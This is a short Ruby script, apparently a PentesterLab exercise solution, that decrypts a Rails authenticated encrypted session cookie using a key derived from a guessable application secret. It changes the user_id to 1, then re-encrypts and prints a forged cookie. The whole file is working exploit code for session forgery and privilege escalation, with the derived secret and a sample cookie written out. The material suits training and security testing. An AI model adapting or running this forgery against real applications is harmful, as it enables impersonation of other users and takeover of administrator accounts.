require 'uri'
require 'base64'
require 'openssl'

cookie = "XngBUKLnXg94N%2FLCEgQo6xDwHp3cHuz965xhHfwmvsxCoC4xgcsj%2BGV%2F49fi6QrivJABSE0nLJXrf7T2jL3%2BAVGFdVgxB54pNHWn0aeCX1RfTxG9epJZlLAWL5aLF9jTTNWlXPB04NmXFDyS89r1shiXuddmfdrsIpc%3D--PjUWiVwZSJ5y9YqD--KCsyNMkVN1Fwlro2xRCQ1w%3D%3D"

encrypted_data, iv, auth_tag = cookie.split("--")

encrypted_data = Base64.decode64(URI.decode(encrypted_data))
iv = Base64.decode64(URI.decode(iv))
auth_tag = Base64.decode64(URI.decode(auth_tag))

def secret
  secret = Digest::MD5.hexdigest("PentesterLab::Application")
  OpenSSL::PKCS5.pbkdf2_hmac_sha1(secret, "authenticated encrypted cookie", 1000, 32)
end
cipher = OpenSSL::Cipher.new("aes-256-gcm")

cipher.decrypt
cipher.key = secret
cipher.iv = iv
cipher.auth_tag = auth_tag
decrypted_data = cipher.update(encrypted_data)
decrypted_data << cipher.final
puts(decrypted_data)

require 'json'
data = JSON.parse decrypted_data
data['user_id'] = 1

cipher = OpenSSL::Cipher.new("aes-256-gcm")
cipher.encrypt
cipher.key = secret

iv = cipher.random_iv
cipher.auth_data = ""
encrypted_data = cipher.update(data.to_json)
encrypted_data << cipher.final

blob = "#{::Base64.strict_encode64 encrypted_data}--#{::Base64.strict_encode64 iv}"
blob = "#{blob}--#{::Base64.strict_encode64 cipher.auth_tag}"
puts URI.escape(blob,"=+/")

